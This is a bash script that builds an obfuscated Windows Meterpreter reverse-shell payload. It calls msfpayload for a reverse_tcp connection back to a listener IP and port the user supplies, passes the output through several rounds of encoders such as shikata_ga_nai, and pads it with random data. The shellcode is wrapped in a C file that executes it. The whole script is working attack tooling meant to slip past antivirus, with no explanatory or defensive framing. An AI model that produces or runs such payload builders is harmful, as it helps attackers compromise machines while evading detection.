#!/bin/bash
# run as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi
ping localhost -c 5 >nul

# Giving Fresh new start so removing old junk
rm -rf seclabs
# if  builtin type -p i686-w64-mingw32-gcc > /dev/null ; then 
# else echo "Please install by Command: apt-get install mingw32-runtime mingw-w64 mingw gcc-mingw32 mingw32-binutils"
# echo "exiting.....";  exit
# fi
echo "Network Device On your Computer :"
cat /proc/net/dev | tr -s  ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
echo -e "Which Interface to use ?  \c"
read interface
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo -e "Please enter a random seed number 1-10000, the larger the number the larger the resulting executable : \c"
read seed
echo -e "How many times you want to encode ? 1-20 : \c"
read enumber
# Get OS name
OS=`uname`
IO="" # store IP
case $OS in
   Linux) IP=`ifconfig $interface  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`;;
   *) IP="Unknown";;
esac
echo "Current Ip is : $IP"
ping localhost -c 5 >nul
./msfpayload windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port EXITFUNC=thread R | ./msfencode -e x86/shikata_ga_nai -c $enumber -t raw | ./msfencode -e x86/jmp_call_additive -c $enumber -t raw | ./msfencode -e x86/call4_dword_xor -c $enumber -t raw |  ./msfencode -e x86/shikata_ga_nai -c $enumber  > test.c  
mkdir seclabs
mv test.c seclabs
cd seclabs
#Replacing plus signs at the end of line
sed -e 's/+/ /g' test.c > clean.c
sed -e 's/buf = /unsigned char micro[]=/g' clean.c > ready.c
echo "#include <stdio.h>" >> temp
echo 'unsigned char ufs[]=' >> temp
for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp2
sed -i 's/$/"/' temp2
sed -i 's/^/"/' temp2  
echo  ';' >> temp2  
cat temp2 >> temp
cat ready.c >> temp
mv temp ready2.c
echo ";" >> ready2.c
echo "int main(void) { ((void (*)())micro)();}" >> ready2.c  
mv ready2.c final.c
echo 'unsigned char tap[]=' > temp3
for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp4
sed -i 's/$/"/' temp4
sed -i 's/^/"/' temp4
echo  ';' >> temp4
cat temp4 >> temp3
cat temp3 >> final.c  
#Cleanup of junk useless files :P
rm -f clean.c
rm -f test.c
rm -f ready.c
rm -f rand.c
rm -f temp2 
rm -f temp3
rm -f temp4
rm -f nul 
